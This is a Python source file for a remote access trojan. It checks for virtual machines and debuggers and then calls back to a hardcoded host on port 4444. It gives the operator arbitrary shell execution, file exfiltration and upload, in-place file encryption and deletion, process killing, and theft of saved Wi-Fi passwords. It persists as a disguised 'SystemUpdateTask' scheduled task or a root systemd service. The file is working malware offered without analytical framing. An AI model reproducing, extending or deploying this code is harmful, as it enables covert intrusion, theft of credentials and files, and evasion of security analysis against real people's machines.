import os
import sys
import time
import socket
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import platform
import psutil



# ------------------ Encryption ------------------

# Generate a random 256-bit key
key = get_random_bytes(32)
# Generate a random 96-bit nonce
nonce = get_random_bytes(12)

def encrypt(data: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    return cipher.encrypt(data)

def decrypt(data: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    return cipher.decrypt(data)

def to_chunks(data: bytes, chunk_size: int = 1024):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

# ------------------ Anti-Detection ------------------

def check_vm():
    vm_indicators = [
        "VMware",
        "VBox",
        "QEMU",
        "Xen"
    ]
    
    try:
        vm_count = 0
        os_name = platform.system()
        
        if os_name == "Windows":
            
            system_info = subprocess.check_output("systeminfo", shell=True).decode().lower()
            
            
            for indicator in vm_indicators:
                if indicator.lower() in system_info:
                    vm_count += 1
            
            
            vm_processes = ["vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "VBoxService.exe"]
            for proc in vm_processes:
                if subprocess.run(f"tasklist | findstr {proc}", shell=True).returncode == 0:
                    vm_count += 1
            
            
            try:
                hw_info = subprocess.check_output("wmic computersystem get manufacturer,model", shell=True).decode().lower()
                if "vmware" in hw_info or "virtualbox" in hw_info or "qemu" in hw_info:
                    vm_count += 2
            except:
                pass
                
            
            try:
                services = subprocess.check_output("wmic service get name", shell=True).decode().lower()
                if "vmware" in services or "vbox" in services:
                    vm_count += 1
            except:
                pass
                
        else:  # Linux
            
            try:
                system_info = subprocess.check_output("systemd-detect-virt", shell=True).decode().lower()
                if system_info.strip() != "none":
                    vm_count += 2
            except:
                pass
                
            
            vm_processes = ["vmtoolsd", "vmware-toolbox", "VBoxService"]
            for proc in vm_processes:
                if subprocess.run(f"ps aux | grep {proc}", shell=True).returncode == 0:
                    vm_count += 1
            
            
            try:
                hw_info = subprocess.check_output("lscpu", shell=True).decode().lower()
                if "vmware" in hw_info or "virtualbox" in hw_info or "qemu" in hw_info:
                    vm_count += 2
            except:
                pass
                
            
            try:
                modules = subprocess.check_output("lsmod", shell=True).decode().lower()
                if "vmware" in modules or "vbox" in modules:
                    vm_count += 1
            except:
                pass
                
            
            try:
                devices = subprocess.check_output("lspci", shell=True).decode().lower()
                if "vmware" in devices or "virtualbox" in devices:
                    vm_count += 1
            except:
                pass
        
        
        return vm_count >= 3
                
    except:
        return False

def check_debugger():
    try:
        os_name = platform.system()
        debug_count = 0
        
        if os_name == "Windows":
            debugger_processes = [
                "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
                "windbg.exe", "immunitydebugger.exe", "radare2.exe", "ghidra.exe",
                "processhacker.exe", "procexp.exe", "procexp64.exe", "procmon.exe",
                "wireshark.exe", "fiddler.exe", "charles.exe", "tcpview.exe",
                "filemon.exe", "regmon.exe", "cain.exe", "netstat.exe", "tcpview.exe",
                "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe",
                "regmon.exe", "cain.exe", "netstat.exe", "tcpview.exe", "wireshark.exe",
                "fiddler.exe", "httpdebugger.exe", "httpdebuggerpro.exe", "fiddler.exe",
                "charles.exe", "wireshark.exe", "fiddler.exe", "httpdebugger.exe",
                "httpdebuggerpro.exe", "fiddler.exe", "charles.exe", "wireshark.exe"
            ]
            
            for proc in debugger_processes:
                if subprocess.run(f"tasklist | findstr {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                    debug_count += 1
            
            try:
                netstat = subprocess.check_output("netstat -an", shell=True, stderr=subprocess.DEVNULL).decode().lower()
                debug_ports = ["23946", "23947", "23948", "23949", "23950", "23951", "23952", "23953", "23954", "23955"]
                for port in debug_ports:
                    if port in netstat:
                        debug_count += 1
            except:
                pass
                
            try:
                reg_keys = [
                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug",
                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit",
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit\ProcessCreationIncludeCmdLine_Enabled"
                ]
                for key in reg_keys:
                    result = subprocess.run(f'reg query "{key}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if result.returncode == 0:
                        debug_count += 1
            except:
                pass

            debug_tools = [
                "windbg", "x64dbg", "x32dbg", "ollydbg", "ida", "ida64",
                "radare2", "ghidra", "immunitydebugger", "processhacker",
                "procexp", "procmon", "wireshark", "fiddler", "charles"
            ]
            for tool in debug_tools:
                if subprocess.run(f"where {tool}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                    debug_count += 1
            
            debug_vars = ["_NT_SYMBOL_PATH", "_NT_ALT_SYMBOL_PATH", "DBGHELP", "DBGHELP_DOWNLOAD_URL"]
            for var in debug_vars:
                if var in os.environ:
                    debug_count += 1
                    
        else:
            debugger_processes = [
                "gdb", "lldb", "radare2", "ida", "ghidra", "strace", "ltrace",
                "valgrind", "perf", "systemtap", "dtrace", "ftrace", "ebpf",
                "wireshark", "tcpdump", "fiddler", "charles", "mitmproxy"
            ]
            for proc in debugger_processes:
                if subprocess.run(f"ps aux | grep {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                    debug_count += 1
            
            debug_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "LD_DEBUG", "LD_TRACE_LOADED_OBJECTS"]
            for var in debug_vars:
                if var in os.environ:
                    debug_count += 1
            
            try:
                netstat = subprocess.check_output("netstat -tuln", shell=True, stderr=subprocess.DEVNULL).decode().lower()
                debug_ports = ["23946", "23947", "23948", "23949", "23950", "23951", "23952", "23953", "23954", "23955"]
                for port in debug_ports:
                    if port in netstat:
                        debug_count += 1
            except:
                pass
            
            try:
                debug_files = [
                    "/proc/self/status",
                    "/proc/self/fd/0",
                    "/proc/self/cmdline",
                    "/proc/self/environ",
                    "/proc/self/maps",
                    "/proc/self/mem"
                ]
                for file in debug_files:
                    if os.path.exists(file):
                        with open(file, 'r') as f:
                            content = f.read().lower()
                            if "tracerpid" in content and "0" not in content:
                                debug_count += 2
                            if "pipe" in content:
                                debug_count += 1
                            if any(debugger in content for debugger in debugger_processes):
                                debug_count += 1
            except:
                pass
            
            try:
                capabilities = subprocess.check_output("cat /proc/self/status | grep Cap", shell=True, stderr=subprocess.DEVNULL).decode().lower()
                if "cap_sys_ptrace" in capabilities:
                    debug_count += 1
            except:
                pass
        
        return debug_count >= 5
                
    except:
        return False

# ------------------ Operating System Prediction ------------------

def predict_operating_system():
    os_name=platform.system()
    return os_name

# ------------------ Task Scheduler Installation ------------------

class TaskInstaller:
    def __init__(self):
        self.os_type = platform.system()
        self.task_name = "SystemUpdateTask"
        self.current_path = os.path.abspath(sys.executable)

    def install_windows_task(self):
        try:
            cmd = f'schtasks /create /tn "{self.task_name}" /tr "{self.current_path}" /sc onlogon /rl highest /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            return False

    def uninstall_windows_task(self):
        try:
            cmd = f'schtasks /delete /tn "{self.task_name}" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            return False

    def install_linux_service(self):
        try:
            service_content = f"""[Unit]
                                    Description=System Update Task
                                    After=network.target
                                    
                                    [Service]
                                    Type=simple
                                    ExecStart={self.current_path}
                                    Restart=always
                                    RestartSec=3
                                    User=root
                                    
                                    [Install]
                                    WantedBy=multi-user.target
                                    """
            service_path = f"/etc/systemd/system/{self.task_name}.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            subprocess.run("systemctl daemon-reload", shell=True)
            subprocess.run(f"systemctl enable {self.task_name}", shell=True)
            subprocess.run(f"systemctl start {self.task_name}", shell=True)
            return True
        except Exception as e:
            return False

    def uninstall_linux_service(self):
        try:
            subprocess.run(f"systemctl stop {self.task_name}", shell=True)
            subprocess.run(f"systemctl disable {self.task_name}", shell=True)
            service_path = f"/etc/systemd/system/{self.task_name}.service"
            os.remove(service_path)
            subprocess.run("systemctl daemon-reload", shell=True)
            return True
        except Exception as e:
            return False

    def install_task(self):
        if self.os_type == "Windows":
            return self.install_windows_task()
        else:
            return self.install_linux_service()

    def uninstall_task(self):
        if self.os_type == "Windows":
            return self.uninstall_windows_task()
        else:
            return self.uninstall_linux_service()

# ------------------ Client Handler ------------------

class ClientHandler:
    def __init__(self, connection: socket.socket):
        self.connection = connection
        self.task_installer = TaskInstaller()

    def send(self, data: bytes):
        self.connection.sendall(data)

    def recv(self, size: int = 1024) -> bytes:
        return self.connection.recv(size)
    
    def download(self,filename):
        try:
            file_size = int(decrypt(self.recv(1024)).decode())
            block_size = 1024
            num_blocks = file_size // block_size
            remaining_bytes = file_size % block_size
            
            with open(f'{filename}','wb') as file:
                chunk_number = 1
                for i in range(num_blocks):    
                    try:
                        data = self.connection.recv(1024)
                        if not data:  # Connection closed
                            raise ConnectionError("Connection lost during download")
                        decrypted_data = decrypt(data)
                        file.write(decrypted_data)
                        chunk_number += 1
                    except Exception as e:
                        self.send(encrypt(f"Error during download at chunk {chunk_number}: {str(e)}".encode()))
                        return False
                
                try:
                    data = self.connection.recv(remaining_bytes)
                    if not data:  # Connection closed
                        raise ConnectionError("Connection lost during download")
                    decrypted_data = decrypt(data)
                    file.write(decrypted_data)
                except Exception as e:
                    self.send(encrypt(f"Error during final chunk download: {str(e)}".encode()))
                    return False
                
                file.close()
                self.send(encrypt(b"Download completed successfully"))
                return True
        except Exception as e:
            self.send(encrypt(f"Download failed: {str(e)}".encode()))
            return False

    def get_system_info(self):
        try:
            cpu_info = {
                'physical_cores': psutil.cpu_count(logical=False),
                'total_cores': psutil.cpu_count(logical=True),
                'cpu_freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {},
                'cpu_percent': psutil.cpu_percent(interval=1)
            }

            mem = psutil.virtual_memory()
            mem_info = {
                'total': mem.total,
                'available': mem.available,
                'percent': mem.percent,
                'used': mem.used,
                'free': mem.free
            }

            system_info = {
                'computer_name': platform.node(),
                'os_name': platform.system(),
                'os_version': platform.version(),
                'os_release': platform.release(),
                'architecture': platform.machine(),
                'processor': platform.processor()
            }

            return {
                'cpu': cpu_info,
                'memory': mem_info,
                'system': system_info
            }
        except Exception as e:
            return {'error': str(e)}
        
    def upload(self,filename):
        try:
            current_path = os.path.abspath(os.getcwd())
            file_path = os.path.join(current_path,filename)
            
            if not os.path.exists(file_path):
                self.send(encrypt(f"File {filename} not found".encode()))
                return False
                
            file_size_upload = str(os.path.getsize(file_path))
            self.send(encrypt(file_size_upload.encode()))
            time.sleep(0.2)
            
            block_size = 1024
            num_blocks = int(file_size_upload) // block_size
            remaining_bytes = int(file_size_upload) % block_size
            
            with open(filename, 'rb') as file:
                chunk_number = 1
                for i in range(num_blocks):
                    try:
                        data_chunk = file.read(1024)
                        if not data_chunk:  # End of file
                            break
                        encrypted_chunk = encrypt(data_chunk)
                        self.send(encrypted_chunk)
                        chunk_number += 1
                        time.sleep(0.2)
                    except Exception as e:
                        self.send(encrypt(f"Error during upload at chunk {chunk_number}: {str(e)}".encode()))
                        return False
                
                try:
                    data_chunk = file.read(remaining_bytes)
                    if data_chunk:  # Only send if there's remaining data
                        encrypted_chunk = encrypt(data_chunk)
                        self.send(encrypted_chunk)
                except Exception as e:
                    self.send(encrypt(f"Error during final chunk upload: {str(e)}".encode()))
                    return False
                
                file.close()
                self.send(encrypt(b"Upload completed successfully"))
                return True
        except Exception as e:
            self.send(encrypt(f"Upload failed: {str(e)}".encode()))
            return False

    def encrypt_file(self , filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        try:
            with open(file_path,"rb") as file:
                data = file.read()
            file.close()
            data = encrypt(data)
            with open(file_path,"wb") as file:
                file.write(data)
            file.close()
            self.send(encrypt(b"File encrypted successfully"))
        except Exception as e:
            self.send(encrypt(f"Error encrypting file: {e}".encode()))
    
    def decrypt_file(self , filename):
        current_path =  os.path.abspath(os.getcwd())
        file_path = os.path.join(current_path,filename)
        try:
            with open(file_path,"rb") as file:
                data = file.read()
            file.close()
            data = decrypt(data)
            with open(file_path,"wb") as file:
                file.write(data)
            file.close()
            self.send(encrypt(b"File decrypted successfully"))
        except Exception as e:
            self.send(encrypt(f"Error decrypting file: {e}".encode()))
                
    def authenticate(self, valid_user="test", valid_pass="test") -> bool:
        logged_in = False
        counter = 0
        while not logged_in:
            username = decrypt(self.recv()).decode().strip()
            password = decrypt(self.recv()).decode().strip()
            if username == valid_user and password == valid_pass:
                self.send(encrypt(b"Authentication successful"))
                logged_in = True
                return True
            elif counter <2:
                counter += 1
                self.send(encrypt(f"Wrong credentials ,you have {3-counter} more tries".encode()))
            else:
                self.send(encrypt(b"Authentication failed"))
                return False

    def send_data(self, data: bytes):
        encrypted = encrypt(data)
        chunks = to_chunks(encrypted)
        chunk_num = len(chunks)
        self.send(encrypt(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in range(chunk_num):
            self.send(chunks[chunk])
            if decrypt(self.recv()).decode() == f"Chunk {chunk} received":
                continue
            else:
                break

    def handle_commands(self,os_name):
        while True:
            try:
                cmd = decrypt(self.recv()).decode()
                if cmd == "close":
                    self.connection.close()
                    sys.exit()

                elif cmd == "dir":
                    if os_name=="Windows":
                        result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ls -ltrh", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "path":
                    if os_name=="Windows":
                        current = os.path.abspath(os.getcwd())
                        self.send_data(current.encode())
                    else:
                        result = subprocess.run("pwd", shell=True, capture_output=True, text=True).stdout
                        self.send_data(result.encode())

                elif cmd == "ipconfig":
                    if os_name=="Windows":
                        result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ip a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "arp -a":
                    result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd == "wifi-networks":
                    if os_name=="Windows":
                        result = subprocess.run("netsh wlan show profile", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = "Still unavailable on linux"
                    self.send_data(result.encode())
                
                elif cmd == "hostname":
                    if os_name=="Windows":
                        sys_info = self.get_system_info()
                        result = f"Computer Name: {sys_info['system']['computer_name']}\n"
                        result += f"OS Version: {sys_info['system']['os_version']}\n"
                        result += f"OS Release: {sys_info['system']['os_release']}\n"
                        result += f"Architecture: {sys_info['system']['architecture']}\n"
                        result += f"Processor: {sys_info['system']['processor']}\n"
                        result += f"CPU Cores: {sys_info['cpu']['physical_cores']} physical, {sys_info['cpu']['total_cores']} total"
                    else:
                        result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd == "ps":
                    if os_name=="Windows":
                        result = subprocess.run("tasklist /v", shell=True, capture_output=True, text=True).stdout
                    else:
                        result = subprocess.run("ps aux", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())
                
                elif cmd.startswith("kill "):
                    try:
                        target = cmd.split(" ", 1)[1]
                        if os_name=="Windows":
                            try:
                                pid = int(target)
                                result = subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True, text=True)
                            except ValueError:
                                result = subprocess.run(f"taskkill /F /IM {target}", shell=True, capture_output=True, text=True)
                        else:
                            try:
                                pid = int(target)
                                result = subprocess.run(f"kill -9 {pid}", shell=True, capture_output=True, text=True)
                            except ValueError:
                                result = subprocess.run(f"pkill -9 {target}", shell=True, capture_output=True, text=True)
                        
                        if result.returncode == 0:
                            self.send(encrypt(b"1"))
                            self.send(encrypt(f"Successfully killed process: {target}".encode()))
                        else:
                            self.send(encrypt(b"1"))
                            self.send(encrypt(f"Failed to kill process: {target}\nError: {result.stderr}".encode()))
                    except Exception as e:
                        self.send(encrypt(b"1"))
                        self.send(encrypt(f"Error killing process: {str(e)}".encode()))
                    self.recv()
                
                elif cmd == "system":
                    try:
                        if os_name=="Windows":
                            sys_info = self.get_system_info()
                            cpu_usage = sys_info['cpu']['cpu_percent']
                            mem_info = sys_info['memory']
                            
                            output = "System Resource Usage:\n"
                            output += f"CPU Usage: {cpu_usage}%\n"
                            output += f"Memory Usage: {mem_info['percent']:.1f}%\n"
                            output += f"Total Memory: {mem_info['total']/1024/1024/1024:.1f} GB\n"
                            output += f"Used Memory: {mem_info['used']/1024/1024/1024:.1f} GB\n"
                            output += f"Free Memory: {mem_info['free']/1024/1024/1024:.1f} GB"
                        else:
                            cpu_cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}'"
                            mem_cmd = "free -m | grep Mem"
                            
                            cpu_result = subprocess.run(cpu_cmd, shell=True, capture_output=True, text=True)
                            mem_result = subprocess.run(mem_cmd, shell=True, capture_output=True, text=True)
                            
                            cpu_usage = cpu_result.stdout.strip() or "0"
                            mem_values = mem_result.stdout.split()
                            
                            if len(mem_values) >= 7:
                                total_mem = int(mem_values[1])
                                used_mem = int(mem_values[2])
                                free_mem = int(mem_values[3])
                                mem_percent = (used_mem / total_mem * 100) if total_mem > 0 else 0
                                
                                output = "System Resource Usage:\n"
                                output += f"CPU Usage: {cpu_usage}%\n"
                                output += f"Memory Usage: {mem_percent:.1f}%\n"
                                output += f"Total Memory: {total_mem/1024:.1f} GB\n"
                                output += f"Used Memory: {used_mem/1024:.1f} GB\n"
                                output += f"Free Memory: {free_mem/1024:.1f} GB"
                            else:
                                output = "Failed to get memory information"
                        
                        self.send(encrypt(b"1"))
                        self.send(encrypt(output.encode()))
                    except Exception as e:
                        self.send(encrypt(b"1"))
                        self.send(encrypt(f"Error getting system info: {str(e)}".encode()))
                    self.recv()
                
                elif cmd.startswith("wifi-password "):
                    wifi_network = cmd[14:]
                    command = f'netsh wlan show profile "{wifi_network}" key=clear'
                    if os_name=="Windows":
                        result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                    else:
                        command = f"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | grep -i '{wifi_network}'"
                        try:
                            result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                            if not result:
                                result = f"No password found for network: {wifi_network}"
                        except:
                            result = "Failed to retrieve WiFi password. May need sudo privileges."
                    self.send_data(result.encode())                    

                elif cmd.startswith("del "):
                    filename = cmd[4:]
                    try:
                        os.remove(os.path.join(os.getcwd(), filename))
                        self.send(encrypt(b"File deleted"))
                    except:
                        self.send(encrypt(b"Deletion failed"))

                elif cmd.startswith("cd "):
                    directory = cmd[3:]
                    self.send(encrypt(b"1"))
                    try:
                        os.chdir(directory)
                        current = os.path.abspath(os.getcwd())
                        time.sleep(0.5)
                        self.send(encrypt(f"Changed to {current}".encode()))
                    except:
                        self.send(encrypt(b"Directory change failed"))
                    self.recv()

                elif cmd.startswith("download "):
                    file_name = decrypt(self.recv()).decode()
                    self.upload(file_name)

                elif cmd.startswith("upload "):
                    file_name = decrypt(self.recv()).decode()
                    self.download(file_name)

                elif cmd.startswith("shell "):
                    command = cmd[6:]
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    self.send_data(result.stdout.encode())
                
                elif cmd.startswith("encrypt "):
                    file_name = decrypt(self.recv()).decode()
                    self.encrypt_file(file_name)        

                elif cmd.startswith("decrypt "):
                    file_name = decrypt(self.recv()).decode()
                    self.decrypt_file(file_name)          

                elif cmd == "install-task":
                    self.send(encrypt(b"1"))
                    if self.task_installer.install_task():
                        self.send(encrypt(b"Task installed successfully"))
                    else:
                        self.send(encrypt(b"Task installation failed"))
                    self.recv()

                elif cmd == "uninstall-task":
                    self.send(encrypt(b"1"))
                    if self.task_installer.uninstall_task():
                        self.send(encrypt(b"Task uninstalled successfully"))
                    else:
                        self.send(encrypt(b"Task uninstallation failed"))
                    self.recv()

                else:
                    self.send(encrypt(b"1"))
                    self.send(encrypt(b"Unknown command"))
                    self.recv()

            except Exception as e:
                self.send(b'1')
                self.send(encrypt(f"Error: {e}".encode()))
                self.recv()
                break

# ------------------ Main Server ------------------

def Connect_to_server():
    if not (check_vm() or check_debugger()):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            operating_system = predict_operating_system()
            while 1:
                try:
                    sock.connect(("192.168.50.200",4444))
                    time.sleep(1)
                    sock.sendall(key)  # Send 256-bit key
                    time.sleep(1)
                    sock.sendall(nonce)  # Send 96-bit nonce
                    time.sleep(1)
                    sock.sendall(operating_system.encode())
                    client = ClientHandler(sock)
                    if client.authenticate():
                        client.handle_commands(operating_system)
                    else:
                        client.connection.close()
                    return
                except Exception:
                    timer = 20
                    for i in range(timer,0,-1):
                        time.sleep(1)
    else:
        sys.exit()

if __name__ == "__main__":
    Connect_to_server()